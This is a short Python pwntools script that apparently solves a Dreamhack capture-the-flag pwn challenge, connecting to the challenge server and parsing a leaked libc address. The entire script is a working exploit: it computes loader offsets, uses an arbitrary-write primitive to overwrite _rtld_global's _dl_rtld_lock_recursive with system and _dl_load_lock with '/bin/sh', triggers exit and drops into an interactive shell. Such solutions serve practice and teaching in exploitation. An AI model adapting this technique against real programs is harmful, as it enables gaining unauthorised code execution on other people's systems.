from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16902
r = remote(HOST, PORT)

r.recvuntil(b': ')

libc = int(r.recvline().strip().decode(), 16) - 0x3ec760
ld = libc+0x3f1000
rtld_global = ld+0x228060
dl_rtld_lock_recursive = rtld_global+3840
dl_load_lock = rtld_global+2312
system = libc+0x4f440
binsh = 0x68732f6e69622f

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
r.sendlineafter(b'data: ', str(system).encode())

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'addr: ', str(dl_load_lock).encode())
r.sendlineafter(b'data: ', str(binsh).encode())

r.sendlineafter(b'> ', b'0')

r.interactive()